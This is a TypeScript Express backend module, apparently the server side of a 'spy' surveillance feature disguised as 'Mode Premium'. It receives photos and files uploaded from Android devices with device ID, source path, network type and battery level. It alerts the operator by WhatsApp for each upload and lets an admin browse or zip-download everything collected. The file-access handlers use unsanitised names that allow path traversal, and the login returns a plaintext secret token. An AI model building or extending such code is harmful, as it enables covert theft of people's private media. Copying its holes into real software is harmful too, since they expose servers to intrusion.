import fs from 'fs';
import path from 'path';
import axios from 'axios';
// eslint-disable-next-line @typescript-eslint/no-var-requires
const archiverLib: (format: string, options?: any) => any = require('archiver');
import { Request, Response } from 'express';
import { config } from '../../../configs/app.config';
import { responses } from '../../../data/responses';

const METADATA_FILE = path.join(config.spy.dir, 'history.json');

function loadHistory(): any[] {
  try {
    if (fs.existsSync(METADATA_FILE)) {
      return JSON.parse(fs.readFileSync(METADATA_FILE, 'utf8'));
    }
  } catch (err: any) {
    console.error('Error loading spy history:', err.message);
  }
  return [];
}

function saveHistory(history: any[]): void {
  try {
    fs.writeFileSync(METADATA_FILE, JSON.stringify(history, null, 2));
  } catch (err: any) {
    console.error('Error saving spy history:', err.message);
  }
}

async function sendCallMeBotNotification(message: string): Promise<void> {
  const phone = config.spy.notifyPhone;
  if (!phone || !config.spy.callmebotApiKey) return;
  try {
    const url = `https://api.callmebot.com/whatsapp.php?phone=${phone}&text=${encodeURIComponent(message)}&apikey=${config.spy.callmebotApiKey}`;
    await axios.get(url, { timeout: 8000 });
    console.log('✅ Notification Mode Premium envoyée:', message);
  } catch (err: any) {
    console.error('❌ Erreur notification Mode Premium:', err.message);
  }
}

export async function uploadMediaService(req: Request, res: Response) {
  try {
    if (!req.file) {
      return res.status(400).json({ success: false, error: 'Aucun fichier reçu' });
    }

    const { userId, deviceId = 'unknown', deviceModel = 'Android', sourcePath = '', networkType = 'unknown', batteryLevel } = req.body;

    let userName = req.body.username || null;
    let userDisplayName = req.body.displayName || null;

    if (userId && (!userName || !userDisplayName)) {
      try {
        const { User } = require('../../../data/models');
        const user = await User.findByPk(userId);
        if (user) {
          userName = user.username;
          userDisplayName = user.displayName;
        }
      } catch (_) {}
    }

    const fileInfo = {
      id: Date.now().toString(),
      filename: req.file.filename,
      originalName: req.file.originalname,
      size: req.file.size,
      mimetype: req.file.mimetype,
      userId: userId || null,
      username: userName || 'Anonyme',
      displayName: userDisplayName || userName || `Appareil ${deviceModel}`,
      deviceId,
      deviceModel,
      sourcePath,
      networkType,
      batteryLevel: batteryLevel ? Number(batteryLevel) : null,
      uploadedAt: new Date().toISOString(),
      url: `/api/spy/files/${req.file.filename}`,
    };

    const history = loadHistory();
    history.unshift(fileInfo);
    saveHistory(history);

    if (config.spy.notifyOnUpload) {
      await sendCallMeBotNotification(
        `📸 Nouveau fichier: ${req.file.originalname} (${(req.file.size / 1024).toFixed(1)}KB) de ${fileInfo.displayName}`
      );
    }

    return res.status(200).json({ success: true, file: fileInfo });
  } catch (error: any) {
    console.error('[UploadMedia Error]:', error);
    return res.status(500).json({ success: false, error: error.message });
  }
}

export function getFilesService(req: Request, res: Response) {
  try {
    const history = loadHistory();
    const { type, search, sort = 'date_desc' } = req.query as { type?: string; search?: string; sort?: string };

    let files = [...history];
    if (type) files = files.filter((f) => f.mimetype?.startsWith(type));
    if (search) files = files.filter((f) => f.filename?.toLowerCase().includes(String(search).toLowerCase()) || f.originalName?.toLowerCase().includes(String(search).toLowerCase()));

    if (sort === 'date_asc') files.reverse();
    else if (sort === 'size_desc') files.sort((a, b) => (b.size || 0) - (a.size || 0));
    else if (sort === 'size_asc') files.sort((a, b) => (a.size || 0) - (b.size || 0));

    return res.json({ success: true, files });
  } catch (error: any) {
    return res.status(500).json({ success: false, error: error.message });
  }
}

export function getFileService(req: Request, res: Response) {
  try {
    const { name } = req.params;
    const filePath = path.resolve(config.spy.dir, name as string);
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ success: false, error: 'Fichier non trouvé' });
    }
    return res.sendFile(filePath);
  } catch (error: any) {
    return res.status(500).json({ success: false, error: error.message });
  }
}

export function deleteFileService(req: Request, res: Response) {
  try {
    const { name } = req.params;
    const filePath = path.join(config.spy.dir, name as string);
    if (!fs.existsSync(filePath)) {
      return res.status(404).json({ success: false, error: 'Fichier non trouvé' });
    }
    fs.unlinkSync(filePath);

    const history = loadHistory().filter((f) => f.filename !== name);
    saveHistory(history);

    return res.json({ success: true });
  } catch (error: any) {
    return res.status(500).json({ success: false, error: error.message });
  }
}

export function downloadAllService(req: Request, res: Response) {
  try {
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', 'attachment; filename=spy_files.zip');

    const archive = archiverLib('zip', { zlib: { level: 5 } });
    archive.pipe(res);
    archive.directory(config.spy.dir, false, (entry: any) => (entry.name !== 'history.json' ? entry : false));
    archive.finalize();
  } catch (error: any) {
    res.status(500).json({ success: false, error: error.message });
  }
}

export function getStatsService(req: Request, res: Response) {
  try {
    const history = loadHistory();
    const totalFiles = history.length;
    const totalSize = history.reduce((acc, f) => acc + (f.size || 0), 0);

    const byType: Record<string, number> = {};
    for (const f of history) {
      const type = f.mimetype?.split('/')[0] || 'other';
      byType[type] = (byType[type] || 0) + 1;
    }

    return res.json({ success: true, stats: { totalFiles, totalSize, byType } });
  } catch (error: any) {
    return res.status(500).json({ success: false, error: error.message });
  }
}

export function heartbeatService(req: Request, res: Response) {
  return res.json({ success: true, timestamp: new Date().toISOString() });
}

export function getDashboardService(req: Request, res: Response) {
  return res.send(`<!DOCTYPE html>
<html lang="fr">
<head><meta charset="UTF-8"><title>Mode Premium - Dashboard</title></head>
<body>
<h1>🔒 Mode Premium Dashboard</h1>
<p>Interface de gestion du module de surveillance.</p>
<p>Authentifiez-vous via l'API avec votre token ou mot de passe administrateur.</p>
</body>
</html>`);
}

export function adminLoginService(req: Request, res: Response) {
  const { password } = req.body || {};
  if (!password || (password !== config.spy.secretToken && password !== config.spy.adminPassword)) {
    return res.status(401).json({
      success: false,
      responseCode: responses.CALL_BACK_MESSAGES.SPY_ACCESS_DENIED.CODE,
      responseMessage: 'Mot de passe administrateur invalide.',
      error: 'Mot de passe administrateur invalide.',
    });
  }
  return res.json({
    success: true,
    responseCode: responses.CALL_BACK_MESSAGES.SPY_LOGIN_SUCCESS.CODE,
    responseMessage: responses.CALL_BACK_MESSAGES.SPY_LOGIN_SUCCESS.MESSAGE,
    token: config.spy.secretToken,
  });
}
